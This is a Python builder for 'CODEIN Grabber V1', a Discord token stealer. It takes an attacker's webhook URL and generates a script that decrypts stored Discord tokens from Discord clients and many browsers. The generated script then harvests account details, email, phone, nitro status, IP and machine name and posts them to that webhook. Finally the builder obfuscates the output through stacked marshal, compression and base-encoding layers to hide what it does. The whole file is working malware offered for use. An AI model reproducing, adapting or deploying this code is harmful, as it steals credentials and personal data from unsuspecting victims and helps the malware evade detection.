import os
from app.style import *
from base64 import *
import marshal, zlib, base64, lzma
from datetime import datetime
import time
from time import sleep

def clear():
    os.system("cls")
os.system("title CODEIN Grabber V1 - https://blizz.cf/ - https://github.com/LuyaTools")
clear()
tit = """
                             ▄████▄   ▒█████  ▓█████▄ ▓█████  ██▓ ███▄    █ 
                            ▒██▀ ▀█  ▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██▒ ██ ▀█   █ 
                            ▒▓█    ▄ ▒██░  ██▒░██   █▌▒███   ▒██▒▓██  ▀█ ██▒   
                            ▒▓▓▄ ▄██▒▒██   ██░░▓█▄   ▌▒▓█  ▄ ░██░▓██▒  ▐▌██▒   G R A B B E R - V 1
                            ▒ ▓███▀ ░░ ████▓▒░░▒████▓ ░▒████▒░██░▒██░   ▓██░   
                            ░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░▓  ░ ▒░   ▒ ▒ 
                              ░  ▒     ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░ ▒ ░░ ░░   ░ ▒░
                            ░        ░ ░ ░ ▒   ░ ░  ░    ░    ▒ ░   ░   ░ ░ 
                            ░ ░          ░ ░     ░       ░  ░ ░           ░ 
                            ░                  ░                 
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
print(Colorate.Horizontal(Colors.blue_to_purple, tit, 1))
Write.Input("Press 'ENTER' to launch -> ", Colors.blue_to_purple, interval=0.05)
clear()
webhooklink = Write.Input("Your log-Webhook -> ", Colors.blue_to_purple, interval=0.02)
filename = Write.Input("Filename -> ", Colors.blue_to_purple, interval=0.02)
f = open(r"output\\" + filename + ".py", "w")
f.write("""from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
tokens = []
cleaned = []
checker = []
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
    paths = {
        'Discord': roaming + '\\\\discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Lightcord': roaming + '\\\\Lightcord',
        'Discord PTB': roaming + '\\\\discordptb',
        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
        'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
        'Amigo': local + '\\\\Amigo\\\\User Data',
        'Torch': local + '\\\\Torch\\\\User Data',
        'Kometa': local + '\\\\Kometa\\\\User Data',
        'Orbitum': local + '\\\\Orbitum\\\\User Data',
        'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
        '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
        'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
        'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
        'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
        'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
        'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\\\"):
                i.replace("\\\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f\"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Blizz#8810 (inspired by astraadev)* **|** ||https://github.com/LuyaTools/||\"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Blizz & Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()""".replace("~~WEBHOOK_URL~~", webhooklink))

f.close()
f = open(r"output\\" + filename + ".py", "r")
from colorama import init, Fore
init()
w = Fore.WHITE
r = Fore.MAGENTA
mysrc = f.read()
def obf():
    src = r"output\\" + filename + ".py"
    marsrc = compile(mysrc, 'coduter', 'exec')
    encode1 = marshal.dumps(marsrc)
    encode2 = zlib.compress(encode1)
    encode7 = lzma.compress(encode2)
    encode3 = base64.b64encode(encode7)
    encode6 = base64.b85encode(encode3)
    symbol = '__CODEIN_WALL' *75
    with open(src, 'r',errors='ignore') as e:
        MONKEYHAHA = e.read()
    with open(src, 'w') as f:
        f.write(symbol+f"='{symbol}'\n")
        f.write("import base64, marshal, zlib, lzma\n")
        f.write(symbol+f"='{symbol}'\n")
        f.write("\n"+symbol+f"='{symbol}'\n")
        f.write("\n"+MONKEYHAHA)
        f.write("\n"+symbol+f"='{symbol}'\n")
    b64 = lambda _monkay : base64.b64encode(_monkay)
    mar = lambda _monkay : marshal.dumps(compile(_monkay,'<x>','exec'))
    zlb = lambda _monkay : zlib.compress(_monkay)
    OFFSET = 100
    symbol = '__CODEIN_CODEIN' * 50
    with open(src, 'r', encoding='utf-8', errors='ignore') as file:
        content = file.read()
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    code = f'{symbol} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) +1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + str(byte)
        code += f'{symbol} += "{_str}"\n'
        index += OFFSET
    code2 =  f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({symbol}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
    for x in range(5):
        method = repr(b64(zlb(mar(code2.encode('utf8'))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
    z = []
    for i in data:
        z.append(ord(i))
    beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    marsrc = compile(beforemarsh, 'coduter', 'exec')
    obfmarsh = marshal.dumps(marsrc)
    print(f"{w}┌───[{r}CODEIN{w}] Starting Obfuscator...")
    now = datetime.now()
    ct = now.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added Marshal..")
    obfzlib = zlib.compress(obfmarsh)
    time.sleep(0.2)
    now2 = datetime.now()
    ct = now2.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added zlib..")
    obflzma = lzma.compress(obfzlib)
    now3 = datetime.now()
    ct = now3.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added lzma..")
    obfbase64 = base64.b64encode(obflzma)
    time.sleep(0.1)
    now4 = datetime.now()
    ct = now4.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added base64..")
    obfbase16 = base64.b16encode(obfbase64)
    now5 = datetime.now()
    ct = now5.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added base16..")
    obfbase32 = base64.b32encode(obfbase16)
    time.sleep(0.5)
    now6 = datetime.now()
    ct = now6.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added base32..")
    obfbase85 = base64.b85encode(obfbase32)
    now7 = datetime.now()
    ct = now7.strftime("%H:%M:%S")
    print(f"{w}│ [{r}CODEIN{w}] [{r}{ct}{w}] {r}Added base85..")
    code += f'exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b16decode(base64.b32decode(base64.b85decode({obfbase85}))))))))'
    with open(src, 'w+',errors='ignore') as f:
        f.write("import marshal, zlib, base64, lzma\n")
        f.write(code)
        f.write(f"\n{symbol} = '{symbol}'")
    print(f"{w}└───[{r}CODEIN{w}] SUCCESS: Encrypted Token Grabber generated in the output folder!")
    time.sleep(10)
    os.system("cls")
obf()
input()